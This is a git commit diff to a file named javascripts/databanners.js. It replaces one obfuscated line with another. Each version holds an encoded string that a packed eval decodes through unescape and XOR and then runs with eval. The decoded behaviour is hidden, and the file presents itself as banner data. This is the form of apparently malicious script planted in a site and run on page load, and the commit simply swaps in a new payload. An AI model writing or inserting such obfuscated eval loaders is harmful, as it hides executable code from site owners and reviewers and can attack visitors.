f9b03a6d7fdad7f1e37f763da6afc8e49cfb86f4
cinbit <saintyang@hotmail.com>
2015-02-18 02:42:28 +0800

    20150218
    change

--- javascripts/databanners.js
+++ javascripts/databanners.js
@@ -4,4 +4,4 @@
 *  @email  cinbit@sina.com
 */
 
-var ssstttrrrstr="V%7El%3D%7D%7F%3A%248ysb4R%60cqv%26%247%01kmS7%5B%259%23yqRv%24-0nhu%225xzras%7Cuigaix%25qiwi+lwom%02b%25%17%7D%7FA%28E7+5oc%60x*%3E%22x%7Eg0+%60sruw9-.Whi3wrjzw%7Ex%3Bw%7C%7F%3Ecficy%7B%258%3A3%3F%3C%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
+var ssstttrrrstr="awg4rv1-/%60h%7B+K%7Bzf%7F--8%08%60DD.@%3C%26%3Abhe%7F/%24%3Fgc%7C5%2Cccmxheb%60lhfq.X%7Enr2sntt5k.%1ErvJ%21R.0%2Cpz%7Ba%3D7%29qqn%3B%02wjil%2156o%60a%3Bcv%7Bs%7F%21mba%24i%60feoq%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
